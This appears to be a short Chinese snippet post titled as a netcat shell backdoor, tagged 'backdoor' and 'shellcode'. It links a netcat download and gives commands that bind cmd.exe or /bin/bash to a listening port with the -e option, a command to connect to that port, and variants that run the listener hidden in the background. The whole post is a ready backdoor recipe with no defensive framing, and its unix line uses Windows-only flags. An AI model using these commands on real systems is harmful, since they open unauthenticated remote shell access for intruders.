---
title: netcat创建shell后门
tags:
  - Snippet
  - shell
  - 后门
  - netcat
categories:
  - - shellcode
    - shell
date: 2023-02-08 10:44:55
---


[下载netcat](https://eternallybored.org/misc/netcat/)

```bash
# -l: 一次性, -t: 使用telnet协议, -e 关联程序
nc -l -p <端口> -t -e cmd.exe

# -L: 重复, -t: 使用telnet协议, -e 关联程序
nc -L -p <端口> -t -e cmd.exe

# 连接
nc <ip or server host> <port>
```

## 后台运行

```bash
# windows
start /b nc -L -p <端口> -t -e cmd.exe

# unix
nc -L -p <端口> -t -d -e /bin/bash
```

